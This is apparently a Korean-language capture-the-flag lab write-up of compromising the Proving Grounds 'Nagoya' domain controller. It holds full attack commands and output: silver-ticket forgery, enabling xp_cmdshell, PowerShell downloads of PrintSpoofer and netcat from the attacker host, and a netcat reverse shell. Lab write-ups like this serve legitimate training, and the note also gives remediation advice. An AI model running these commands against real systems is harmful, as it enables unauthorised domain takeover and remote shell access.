┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ impacket-lookupsid nagoya-industries.com/craig.carr:Spring2023@192.168.120.21
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at 192.168.120.21
[*] StringBinding ncacn_np:192.168.120.21[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1969309164-1513403977-1686805993
498: NAGOYA-IND\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: NAGOYA-IND\Administrator (SidTypeUser)
501: NAGOYA-IND\Guest (SidTypeUser)
502: NAGOYA-IND\krbtgt (SidTypeUser)
512: NAGOYA-IND\Domain Admins (SidTypeGroup)
513: NAGOYA-IND\Domain Users (SidTypeGroup)
514: NAGOYA-IND\Domain Guests (SidTypeGroup)
```

![[Pasted image 20260707111134.png]]

`AccountDomainSid` 는 계정 SID 에서 RID 를 뗀 값이라, `whoami /user` 결과에서 마지막 `-RID` 를 손으로 지워도 같음.

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ python3 -c 'import hashlib;print(hashlib.new("md4","Service1".encode("utf-16le")).hexdigest())'
e3a0168bc21cfb88b95c954a5b18f57c
```

![[Pasted image 20260707111021.png]]

NT해시는 UTF-16LE 로 인코딩한 평문의 MD4 — 솔트도 반복도 없음. `encode("utf-16le")` 를 빼거나 `utf-16`(BOM 포함)으로 쓰면 값이 달라짐. secretsdump 로 해시를 직접 얻었다면 평문 없이 그 값을 그대로 씀.

**1433 이 외부에서 안 보임 → ligolo-ng 로 내부 터널.** `nxc-sweep` 으로 svc_mssql 자격증명이 어디에 통하는지 한 번에 훑음:

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ nxc-sweep 192.168.120.21 -u svc_mssql -p 'Service1'
[*] Starting NXC sweep for 192.168.120.21 as svc_mssql ...

[+] Port 445 open. Checking smb ...
SMB         192.168.120.21  445    NAGOYA           [*] Windows 10 / Server 2019 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False)
SMB         192.168.120.21  445    NAGOYA           [+] nagoya-industries.com\svc_mssql:Service1
SMB         192.168.120.21  445    NAGOYA           [*] Enumerated shares
SMB         192.168.120.21  445    NAGOYA           Share           Permissions     Remark
SMB         192.168.120.21  445    NAGOYA           -----           -----------     ------
SMB         192.168.120.21  445    NAGOYA           ADMIN$                          Remote Admin
SMB         192.168.120.21  445    NAGOYA           C$                              Default share
SMB         192.168.120.21  445    NAGOYA           IPC$            READ            Remote IPC
SMB         192.168.120.21  445    NAGOYA           NETLOGON        READ            Logon server share
SMB         192.168.120.21  445    NAGOYA           SYSVOL          READ            Logon server share

[+] Port 5985 open. Checking winrm ...
WINRM       192.168.120.21  5985   NAGOYA           [*] Windows 10 / Server 2019 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com)
WINRM       192.168.120.21  5985   NAGOYA           [-] nagoya-industries.com\svc_mssql:Service1

[+] Port 3389 open. Checking rdp ...
RDP         192.168.120.21  3389   NAGOYA           [*] Windows 10 or Windows Server 2016 Build 17763 (name:NAGOYA) (domain:nagoya-industries.com) (nla:False)
RDP         192.168.120.21  3389   NAGOYA           [+] nagoya-industries.com\svc_mssql:Service1

[-] Port 1433 closed/filtered. Skipping mssql

[-] Port 21 closed/filtered. Skipping ftp

[*] All active services checked.
```

**`[-] Port 1433 closed/filtered`** — 자격증명은 맞는데 서비스에 닿을 수 없음. nmap 의 `65514 filtered` 가 여기서 의미를 가짐. MSSQL 은 살아 있고 호스트 방화벽이 외부 접근만 막고 있음. 해법은 `christopher.lewis` 셸을 발판 삼아 내부로 터널을 놓는 것(ligolo-ng).

**수동 대안** — `nxc-sweep` 은 포트별 nxc 호출을 묶은 래퍼일 뿐이라 `nc -zv <타겟> <포트>` + 서비스별 클라이언트를 하나씩 돌려도 같은 판정이 나옴. ligolo-ng 대신에는 `chisel` 이나 `plink -R` 을 쓸 수 있고, 발판에 SSH 가 있으면 `ssh -L` 이 가장 간단함(이 박스에는 SSH 가 없어 못 씀).

```bash
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
sudo ip route add 240.0.0.1/32 dev ligolo
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```
— 출처: `~/.zsh_history`

세 줄의 역할 — ① `ligolo` tun 인터페이스 생성 후 UP(인터페이스가 이미 있으면 `ip link set ligolo up` 만). ② 타겟 로컬호스트로 갈 라우트. `240.0.0.1` 은 ligolo 관례상 「에이전트의 127.0.0.1」. ③ 프록시 = ligolo 콘솔 기동.

![[Pasted image 20260707103550.png]]

에이전트는 evil-winrm 의 `upload` 로 올린 뒤 실행:

```powershell
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> upload agent.exe
*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> .\agent.exe -connect 192.168.45.175:11601 -ignore-cert
agent.exe : time="2026-07-06T18:30:42-07:00" level=warning msg="warning, certificate validation disabled"
time="2026-07-06T18:30:42-07:00" level=info msg="Connection established" addr="192.168.45.175:11601"
```

![[Pasted image 20260707103620.png]]

`-ignore-cert` 없이는 `-selfcert` 로 만든 자체 서명 인증서를 에이전트가 거부함. PowerShell 이 stderr 를 `NativeCommandError` 로 감싸 빨갛게 보이지만 경고일 뿐이고, `Connection established` 가 실제 결과.

> [!note] 타겟 시계는 UTC-7 이다
> 위 로그의 `2026-07-06T18:30:42-07:00` 은 타겟 로컬 시각이고, KST 로는 2026-07-07 10:30:42. 스크린샷 파일명(`20260707103620`)과 6분 차이가 나는데, 이건 캡처 시각이 아니라 **볼트에 붙여넣은 시각**이라서다. 파일명 시각은 사건의 상한으로만 쓸 수 있다.

프록시 콘솔에서 세션을 잡고 터널을 연다:

```text
ligolo-ng » INFO[0171] Agent joined.   id=005056abf3bf name="NAGOYA-IND\Christopher.Lewis@nagoya" remote="192.168.120.21:49860"
ligolo-ng » session
? Specify a session : 1 - NAGOYA-IND\Christopher.Lewis@nagoya - 192.168.120.21:49860 - 005056abf3bf
[Agent : NAGOYA-IND\Christopher.Lewis@nagoya] » start
INFO[0191] Starting tunnel to NAGOYA-IND\Christopher.Lewis@nagoya (005056abf3bf)
```

![[Pasted image 20260707103631.png]]

`start` 를 안 치면 터널이 안 열림 — 세션만 선택하고 끝내는 게 흔한 실수. 확인:

```bash
┌──(kali㉿kali)-[~/git/ligolo]
└─$ ip route | grep 240
240.0.0.1 dev ligolo scope link

┌──(kali㉿kali)-[~/git/ligolo]
└─$ nc -zv 240.0.0.1 1433
nagoya.nagoya-industries.com [240.0.0.1] 1433 (ms-sql-s) open
```

![[Pasted image 20260707103642.png]]

`ip route` 에 `linkdown` 이 붙어 있으면 인터페이스가 UP 이 아님. `/etc/hosts` 에 `240.0.0.1 nagoya.nagoya-industries.com` 을 넣어둔 게 다음 단계의 전제 — Kerberos 인증은 IP 가 아니라 SPN 의 호스트명으로 붙어야 하기 때문(`nc` 출력에 그 이름이 되비쳐 나오는 게 hosts 가 먹었다는 증거).

실버티켓 위조:

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c \
  -domain-sid S-1-5-21-1969309164-1513403977-1686805993 \
  -domain nagoya-industries.com \
  -spn MSSQL/nagoya.nagoya-industries.com \
  -user-id 500 Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for nagoya-industries.com/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

![[Pasted image 20260707103942.png]]

플래그 하나하나가 필수 — `-spn` 이 있으면 실버(그 서비스 전용), 없고 krbtgt 해시면 골든. `-domain-sid` 가 틀리면 PAC 안의 그룹 SID 가 도메인과 안 맞아 서비스가 거부함. `-user-id 500` 이 사칭 대상(RID 500=Administrator)이고 ticketer 가 표준 그룹(`-groups` 기본값 `513, 512, 520, 518, 519` = Domain Users·Domain Admins·Group Policy Creator Owners·Schema Admins·Enterprise Admins)을 함께 박아 넣어 따로 줄 필요가 없음. `[가정]` PAC 의 어느 SID 가 sysadmin 으로 이어졌는지는 기록에 없음 — SQL Server 는 2008 이후 기본 설치에서 `BUILTIN\Administrators` 를 sysadmin 에 자동 추가하지 않으므로(이 인스턴스는 160 = SQL Server 2022) "빌트인 관리자 = sysadmin" 을 당연히 여기면 안 됨. 관측된 것은 결과뿐 — 접속 직후 프롬프트가 `dbo@master` 였고 `sp_configure` 가 통했으니 그 세션은 sysadmin 이었음. `-domain` 은 대문자 realm 으로 정규화됨(`NAGOYA-INDUSTRIES.COM`).

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ export KRB5CCNAME=$PWD/Administrator.ccache

┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ klist
Ticket cache: FILE:/home/kali/PG/Nagoya/Administrator.ccache
Default principal: Administrator@NAGOYA-INDUSTRIES.COM

Valid starting       Expires              Service principal
07/07/2026 10:39:08  07/04/2036 10:39:08  MSSQL/nagoya.nagoya-industries.com@NAGOYA-INDUSTRIES.COM
        renew until 07/04/2036 10:39:08
```

유효기간 10년 — 타깃 설정이 아니라 ticketer 의 `-duration` 기본값(87600시간=24×365×10)이 만든 도구 산물. 진짜 KDC 발급 서비스 티켓은 기본 10시간이니 이 한 줄만 봐도 위조임이 드러남(방어 관점 탐지 지표). 조용히 가고 싶으면 `-duration 10` 정도로 줄여야 함. `KRB5CCNAME` 은 절대경로로 export 하는 게 중요 — impacket 이 상대경로를 그대로 들고 다니다 작업 디렉터리가 바뀌면 못 찾음.

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ impacket-mssqlclient nagoya.nagoya-industries.com -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (NAGOYA-IND\Administrator  dbo@master)>
```

![[Pasted image 20260707104041.png]]

**대상을 IP 가 아니라 `nagoya.nagoya-industries.com` 으로 준 것이 핵심.** `-k` 는 ccache 의 티켓을 쓰라는 뜻이고, 티켓 안의 SPN 은 `MSSQL/nagoya.nagoya-industries.com`. IP 로 접속하면 클라이언트가 `MSSQL/240.0.0.1` 을 찾으려 해서 티켓이 안 맞음. `/etc/hosts` 로 그 이름을 `240.0.0.1`(ligolo 터널)로 돌려놓은 이유가 이것. 프롬프트의 `NAGOYA-IND\Administrator` 가 위조가 먹혔다는 증거.

```text
SQL (NAGOYA-IND\Administrator  dbo@master)> enable_xp_cmdshell
INFO(nagoya\SQLEXPRESS): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(nagoya\SQLEXPRESS): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (NAGOYA-IND\Administrator  dbo@master)> RECONFIGURE
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell whoami
output
--------------------
nagoya-ind\svc_mssql

NULL
```

![[Pasted image 20260707104209.png]]

**SQL 세션은 Administrator 인데 명령은 `svc_mssql` 로 실행됨.** `xp_cmdshell` 은 프록시 계정이 설정돼 있지 않으면 SQL Server **서비스 계정 컨텍스트**로 프로세스를 띄우기 때문 — 실버티켓이 준 건 "SQL 안에서의 sysadmin"이지 "OS 관리자"가 아니라 한 단계 더 필요함.

`enable_xp_cmdshell` 은 impacket mssqlclient 의 내장 헬퍼. 수동으로는:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### Privilege Escalation – SeImpersonatePrivilege 남용 PrintSpoofer 로 시스템 권한 획득

**Vulnerability Explanation:** MSSQL 서비스 계정(`svc_mssql`)이 `SeImpersonatePrivilege` 를 보유하고 Print Spooler 서비스가 살아 있는 상태. 이 조합은 로컬 관리자 권한 없이도 임의 사용자로의 프로세스 사칭을 허용하는 Potato 계열(PrintSpoofer 등) 공격이 성립하는 표준 조건.

**Vulnerability Fix:** `xp_cmdshell` 을 꺼두고 SQL Server 서비스 계정에서 `SeImpersonatePrivilege` 를 제거. DC 에서 Print Spooler 서비스를 비활성화 — PrintSpoofer 와 PrinterBug 를 동시에 차단.

**Severity:** Critical — 사칭으로 DC 컴퓨터 계정(도메인 관리자와 실질적으로 동등) 획득

**Steps to reproduce the attack:**
1. `xp_cmdshell whoami /priv` 로 `SeImpersonatePrivilege : Enabled` 확인
2. PrintSpoofer64.exe·nc64.exe 를 `C:\programdata\` 에 업로드
3. Kali 에서 리스너 대기
4. `xp_cmdshell` 로 PrintSpoofer 실행 → nc 리버스셸 발사
5. `proof.txt` 를 대화형 셸에서 원위치 `type`

```text
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell whoami /priv
output
--------------------------------------------------------------------------------
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

**`SeImpersonatePrivilege : Enabled`** — 서비스 계정에 거의 항상 붙어 있는 권한이고, 곧바로 Potato 계열이 통한다는 뜻. 셸을 잡으면 `whoami /priv` 부터 치는 이유.

바이너리 두 개를 올림(칼리에서 `python3 -m http.server 80`):

```powershell
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell powershell -c "iwr http://192.168.45.175/PrintSpoofer64.exe -outfile C:\programdata\ps.exe;
output
------
NULL

SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell powershell -c "iwr http://192.168.45.175/nc64.exe -outfile C:\programdata\nc64.exe";
output
------
NULL
```

![[Pasted image 20260707105403.png]]

**출력이 `NULL` 인 게 성공.** `iwr` 은 성공 시 아무것도 안 뱉음 — 실패했으면 예외 텍스트가 나옴. `C:\programdata` 는 모든 계정이 쓸 수 있고 감시가 느슨해 스테이징 경로로 씀.

리스너:

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
```

![[Pasted image 20260707105415.png]]

발사:

```powershell
SQL (NAGOYA-IND\Administrator  dbo@master)> xp_cmdshell C:\programdata\ps.exe -c "C:\programdata\nc64.exe 192.168.45.175 9001 -e cmd.exe"
output
-------------------------------------------
[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL
```

![[Pasted image 20260707105425.png]]

세 줄이 각 단계 — 권한 확인 → 명명 파이프 대기 → 스풀러가 그 파이프에 붙어온 걸 사칭해서 새 프로세스 생성.

**수동 대안** — PrintSpoofer 가 막히면 GodPotato·JuicyPotatoNG 로 교체. `SeImpersonatePrivilege` 가 있으면 Potato 계열 중 하나는 통함. Spooler 가 꺼져 있으면 PrintSpoofer 만 못 쓰고 나머지는 남음(이 박스는 Spooler 가 살아 있어 PrintSpoofer 로 끝남).

```bash
┌──(kali㉿kali)-[~/PG/Nagoya]
└─$ rlwrap nc -lnvp 9001
listening on [any] 9001 ...
connect to [192.168.45.175] from (UNKNOWN) [192.168.120.21] 50031
Microsoft Windows [Version 10.0.17763.4252]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nagoya-ind\nagoya$
```

![[Pasted image 20260707105454.png]]

> [!warning] `nt authority\system` 이 아니라 `nagoya-ind\nagoya$` 가 나왔다
> `nagoya$` 는 이 DC 의 컴퓨터 계정. BloodHound 수집분(`20260706153247_domains.json`)의 도메인 객체 ACE 를 보면 `Domain Controllers` 가 `GetChangesAll` 을, `Enterprise Domain Controllers`(S-1-5-9)가 `GetChanges` 를 가짐. DCSync 는 둘 다 있어야 성립하는데 DC 머신 계정은 양쪽에 다 들어가므로 결과적으로 됨 — `GetChangesAll` 하나가 곧 DCSync 인 것은 아님. 어느 쪽이든 도메인 관리자와 실질적으로 동등한 자리고, 실제로 Administrator 데스크톱을 그대로 읽었음.
> 왜 SYSTEM 표기가 아니라 머신 계정으로 떨어졌는지는 기록이 없다. `[가정]` 사칭된 토큰이 로컬 SYSTEM 이 아니라 네트워크 컨텍스트의 머신 계정이었을 가능성이 있으나 이 박스에서 확인하지 않았음.
> 결과적으로는 상관없었지만, **`whoami` 가 SYSTEM 이 아니라고 실패로 판단하지 말 것.** DC 에서는 머신 계정이 그 이상.

### Post-Exploitation

리버스셸에서 `cd C:\Users\Administrator\Desktop` 후 `dir` → `type proof.txt`. 남아 있는 증거는 스크린샷 한 장이고 화면에 찍힌 범위는 여기까지:

```powershell
 Directory of C:\Users\Administrator\Desktop

06/14/2023  02:53 AM    <DIR>          .
06/14/2023  02:53 AM    <DIR>          ..
06/14/2023  02:53 AM                41 email.txt
07/06/2026  06:24 PM                34 proof.txt
               2 File(s)             75 bytes
               2 Dir(s)  19,701,276,672 bytes free

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
be83df05d75cfee867192bdf8dcd2fdb
```

![[Pasted image 20260707105621.png]]

**Proof.txt value:**
`be83df05d75cfee867192bdf8dcd2fdb`

명령이 두 번씩 되비치는 건 `nc -e cmd.exe` 로 얻은 raw 셸의 에코 — **웹셸이 아니라 대화형 셸에서 원위치 `type`** 이므로 시험 기준으로도 유효한 취득. `proof.txt` 타임스탬프 `07/06/2026 06:24 PM` 은 타겟 로컬 시각(UTC-7)이고 KST 로는 07-07 10:24 — 07-06 저녁에 박스를 세워두고 다음날 아침 다시 켠 시각으로 보임. `[가정]` PG 는 부팅할 때 `proof.txt` 를 새로 쓰고, 07-06 에 바꿔둔 비밀번호가 07-07 에도 그대로 통했으니 리버트가 아니라 재기동으로 추정.

시험 증거 형식 관점 — 이 박스에서는 플래그만 찍었으나, 직전 스크린샷(`…105454.png`)에 `whoami` 와 접속 IP 가 있어 세트로는 성립함. 시험에서는 `whoami; hostname; ip a` 를 한 화면에 담는 습관을 들일 것.

**남긴 흔적** — 되돌리지 않은 것들. 실제 평가라면 전부 보고서에 적어야 함.

- **비밀번호 변경 2건** — `iain.white` 와 `christopher.lewis` 를 `Password123!` 로 바꿈. 원래 값은 복구 불가
- **업로드 파일 3개** — `C:\Users\Christopher.Lewis\Documents\agent.exe`(ligolo), `C:\programdata\ps.exe`(PrintSpoofer64), `C:\programdata\nc64.exe`. 삭제 기록 없음
- **SQL Server 설정 변경** — `show advanced options` 0→1, `xp_cmdshell` 0→1. 되돌리지 않음
- **위조 티켓** — `~/PG/Nagoya/Administrator.ccache` 가 칼리에 남아 있음. 2036년까지 유효
- 칼리 `/etc/hosts` 에 `240.0.0.1 nagoya.nagoya-industries.com` 라인이 남아 있음. 다른 박스 작업에 혼선을 줄 수 있어 정리 대상
- 이 세션의 LHOST 는 `192.168.45.175`(VPN 재접속마다 바뀜)

## 관련

- username-anarchy — https://github.com/urbanadventurer/username-anarchy
- kerbrute — https://github.com/ropnop/kerbrute
- BloodHound / bloodhound-python — https://github.com/dirkjanm/BloodHound.py
- impacket(`GetUserSPNs`·`GetNPUsers`·`ticketer`·`lookupsid`·`mssqlclient`) — https://github.com/fortra/impacket
- ligolo-ng — https://github.com/nicocha30/ligolo-ng (이 박스에서 쓴 것은 v0.8.2)
- PrintSpoofer — https://github.com/itm4n/PrintSpoofer
- hashcat 모드 — `-m 13100` Kerberos 5 TGS-REP etype 23 / `-m 19700` etype 18(AES256)
- Kerberos PAC full signature(KB5020805/CVE-2022-37967) — https://support.microsoft.com/en-us/topic/kb5020805-how-to-manage-kerberos-protocol-changes-related-to-cve-2022-37967-997e9acc-67c5-48e1-8d0d-190269bf4efb (2023-07-11 부터 enforcement 기본)
- SQL Server 2008 R2 보안 변경 — https://learn.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/cc280562(v=sql.105) (`BUILTIN\Administrators` 가 더 이상 기본 sysadmin 아님)

> [!note] 이 노트에는 이 박스를 뚫는 데 쓴 CVE 가 없다
> 위 CVE-2022-37967 은 방어 쪽 참고로만 나온다. `manual_cves: true` 를 목록 없이 넣어 색인이 이 번호를 이 박스의 취약점으로 잡지 않게 막아둠.

- [[Resourced]] — 같은 날(07-06 오전) 작업한 AD 박스. RBCD 위임 조작 경로
- [[Heist]] · [[Vault]] — 같은 세션대의 AD 박스
- [[Hutch]] — 도메인 사용자 열거 → ACL 남용
- **"자격증명을 깼는데 로그인이 안 된다"** 패턴 — 이 노트(실버티켓으로 전환), [[_PLAYBOOK]] `A-24`
- **"nmap 이 안 보여준 포트"** 패턴 — 이 노트(`filtered` 대량 → 내부에서 재열거 → 터널), [[_PLAYBOOK]] `B-71`
- [[_PLAYBOOK#A-52. 자격증명은 맞는데 «어떤 대화형 서비스도» 로그인을 안 받는다]] · [[_PLAYBOOK#A-53. DC 에서 `whoami` 가 SYSTEM 이 아니라 `DOMAIN\HOST$` 로 나온다 — 실패가 아님]] · [[_PLAYBOOK#B-55. 웹 정찰이 곧 스프레이 재료다 — 실명은 계정명, 저작권 연도는 비밀번호 후보]] · [[_PLAYBOOK#B-56. Kerberoast 로 깬 비밀번호가 로그인이 안 되면 «티켓 재료»로 쓴다]] · [[_PLAYBOOK#B-46. `SeImpersonatePrivilege : Enabled` + Spooler 생존 → PrintSpoofer]]
- [[_PLAYBOOK#A-1-23. 확장자 사전을 늘려도 새 경로가 안 나온다 — 라우팅형 앱은 파일이 아님]] · [[_PLAYBOOK#A-3-12. `event not found` — 히스토리 확장이 `!` 를 먹고 «줄 전체»를 폐기한다]] · [[_PLAYBOOK#A-6-10. 도구를 `~/git/` 에서 직접 실행하는 습관이 매번 경로·아키텍처 탐색 비용을 만든다]] · [[_PLAYBOOK#A-51. AD 박스에서 막히면 «취약점»이 아니라 넷을 먼저 본다]] · [[_PLAYBOOK#B-53. 유효한 도메인 자격증명 «하나»를 얻으면 즉시 BloodHound를 돌린다]]
- [[_PLAYBOOK]] — 시행착오·시험 관점·기법 카드의 유일한 소재지
